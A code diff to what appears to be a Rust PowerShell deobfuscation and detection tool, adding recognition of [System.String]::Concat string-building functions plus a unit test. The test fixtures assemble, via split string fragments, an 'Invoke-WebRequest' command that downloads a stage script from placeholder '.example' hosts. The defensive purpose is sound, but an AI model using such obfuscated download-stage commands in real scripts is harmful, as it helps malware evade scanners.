@@ -1083,6 +1083,14 @@ static PS_LITERAL_CONCAT_VAR_RE: Lazy<Regex> =
     Lazy::new(|| Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps literal concat var regex"));
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_STRING_CONCAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Concat\s*\(\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+    )
+    .expect("ps literal string concat extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3845,24 +3853,33 @@ fn expand_literal_string_case_extractor_calls(text: &str) -> String {
 
 fn expand_literal_concat_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !has_literal_extractor_def_signal(&lower) || !text.contains('+') || !text.contains('\'') {
+    if !has_literal_extractor_def_signal(&lower)
+        || !(text.contains('+') || lower.contains("string]::concat"))
+        || !text.contains('\'')
+    {
         return text.to_string();
     }
 
     let mut out = text.to_string();
     for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
-        let Some(caps) = PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE.captures(&body) else {
-            continue;
-        };
-        let Some(expr) = caps.get(1) else {
-            continue;
-        };
-        let after_expr = skip_ascii_ws(body.as_bytes(), expr.end());
-        if body.as_bytes().get(after_expr) == Some(&b'+') {
-            continue;
-        }
-
         let param_index = parse_ps_function_param_indices(&params);
+        let expr = if let Some(caps) = PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE.captures(&body) {
+            let Some(expr) = caps.get(1) else {
+                continue;
+            };
+            let after_expr = skip_ascii_ws(body.as_bytes(), expr.end());
+            if body.as_bytes().get(after_expr) == Some(&b'+') {
+                continue;
+            }
+            expr
+        } else if let Some(caps) = PS_LITERAL_STRING_CONCAT_EXTRACTOR_BODY_RE.captures(&body) {
+            let Some(expr) = caps.get(1) else {
+                continue;
+            };
+            expr
+        } else {
+            continue;
+        };
         let Some(parts) = ps_literal_concat_extractor_parts(expr.as_str(), &param_index) else {
             continue;
         };
@@ -7756,8 +7773,9 @@ impl PsObfuscationSignals {
         let insert_extractor = has_function_def && lower.contains(".insert");
         let string_case_extractor =
             has_function_def && (lower.contains(".tolower") || lower.contains(".toupper"));
-        let literal_concat_extractor =
-            has_function_def && text.contains('+') && text.contains('\'');
+        let literal_concat_extractor = has_function_def
+            && (text.contains('+') || lower.contains("string]::concat"))
+            && text.contains('\'');
         let literal_index_extractor = has_function_def
             && (lower.contains('[')
                 || lower.contains(".chars")
@@ -10171,6 +10189,23 @@ Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-m
                 "'Invoke-WebRequest -Uri https://ps-multi-concat-named-extractor.example/stage.ps1'"
             ),
             "named-argument multi-concat extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_string_concat_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Join-Text($left,$middle,$right) {
+  return [System.String]::Concat($left,$middle,$right)
+}
+Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-concat-named' -middle '-extractor'"#;
+
+        let out = expand_literal_concat_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-string-concat-named-extractor.example/stage.ps1'"
+            ),
+            "named-argument [string]::Concat extractor call was not rewritten:\n{out}"
         );
     }
 
